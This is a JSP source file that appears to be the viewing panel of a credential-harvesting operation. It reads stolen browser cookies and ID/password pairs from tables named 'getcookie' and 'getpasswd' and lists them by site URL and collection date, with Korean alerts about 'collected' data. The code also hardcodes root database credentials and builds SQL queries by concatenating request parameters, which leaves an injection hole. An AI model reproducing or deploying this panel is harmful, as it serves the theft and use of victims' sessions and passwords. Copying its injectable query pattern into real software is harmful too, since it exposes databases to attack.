<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import = "java.sql.*, java.lang.String" %>

<%
	String type = request.getParameter("type");
	if ( type == null ) type = "id_pw";
	String s_url = request.getParameter("s_url");
	String sdate = request.getParameter("sdate");
	if ( sdate == null ) sdate = "20161101";
	String edate = request.getParameter("edate");
	if ( edate == null ) edate = "curdate()";
%>

<html>
<head>
<title>top_frame</title>
<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
</head>

<script type="text/javascript">
    function showCookie() {
       eval(parent.downFrame.location='down_frame.jsp');
    }
</script>

<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">

	<font size="3">

		<table style="width:100%" border="1" cellspacing="0" cellpadding="2"	bordercolor="#6699DD">

<%
Class.forName("com.mysql.jdbc.Driver");
Connection conn = DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306", "root", "toor");
Statement stmt = conn.createStatement();
ResultSet rs = null;
int cnt = 0;
String url = null;
String sql1 = "select url, cookie, cdate from ibory.getcookie";
String sql2 = "select distinct url, id, passwd, cdate from ibory.getpasswd";

	if ( s_url != null && s_url != "" ) {
		sql1 += " where url='"+s_url+"'";
		sql2 += " where url='"+s_url+"'";

		sql1 += " and cdate between '"+sdate+"' and "+edate+" order by cdate desc";
		sql2 += " and cdate between '"+sdate+"' and "+edate+" order by cdate desc";
	} else {
		sql1 += " where cdate between '"+sdate+"' and "+edate+" order by cdate desc";
		sql2 += " where cdate between '"+sdate+"' and "+edate+" order by cdate desc";		
	}
	
	if ( type.equals("cookie") ) {
		try {
			rs = stmt.executeQuery(sql1);
%>
			<tr align="center" bgcolor="#99CCFF" height="20">
				<td style="width:5%">SN</td>
				<td style="width:20%">URL</td>
				<td style="width:60%">Cookie</td>
				<td style="width:15%">Date</td>				
			</tr>
<%
			while(rs.next()) { 
				url = rs.getString("url");
%>
				<tr align="center">
					<td><%= ++cnt %></td>
					<td align="left" style="max-width:150px; word-wrap: break-word;"><a href="<%= url %>"><%= url %></td>
					<td align="left" onclick="showCookie()" style="max-width:400px; word-wrap: break-word; cursor:hand;"><%= rs.getString("cookie") %></td>
					<td><%= rs.getString("cdate") %></td>
				</tr>
<%  		}
			if(cnt==0) { %>
				<script type="text/javascript">window.alert("수집된 Cookie가 없습니다.");</script>				
<%			}
			rs.close();
			stmt.close();
			conn.close();
		} catch (SQLException e) {	e.printStackTrace();
		} finally {
			if(rs!=null)    try {	rs.close();	} catch (SQLException e) {}
			if(stmt!=null) 	try {	stmt.close(); } catch (SQLException e) {}
			if(conn!=null)	try {	conn.close(); } catch (SQLException e) {}
		}
	} else { // ID & Password %>		

			<tr align="center" bgcolor="#99CCFF" height="25">
				<td width="10%">SN</td>
				<td width="40%,*">URL</td>
				<td width="15%">ID</td>
				<td width="15%">Password</td>
				<td width="20%">Datetime</td>
			</tr>
<%
		try {
			rs = stmt.executeQuery(sql2);
		
			while(rs.next()) { 
				url = rs.getString("url");
%>
				<tr align="center">
					<td><%= ++cnt %></td>
					<td align="left"><a href="<%= url %>"><%= url %></a></td>
					<td><%= rs.getString("id") %></td>
					<td><%= rs.getString("passwd") %></td>
					<td><%= rs.getString("cdate") %></td>
				</tr>
<%  		}
			if(cnt==0) { %>
				<script type="text/javascript">window.alert("수집된 ID, Password가 없습니다.");</script>
<%
			}
			rs.close();
			stmt.close();
			conn.close();
		} catch (SQLException e) {	e.printStackTrace();
		} finally {
			if(rs!=null)    try {	rs.close();	} catch (SQLException e) {}
			if(stmt!=null) 	try {	stmt.close(); } catch (SQLException e) {}
			if(conn!=null)	try {	conn.close(); } catch (SQLException e) {}
		}
	}
%>

		</table>
	</font>
</body>

</html>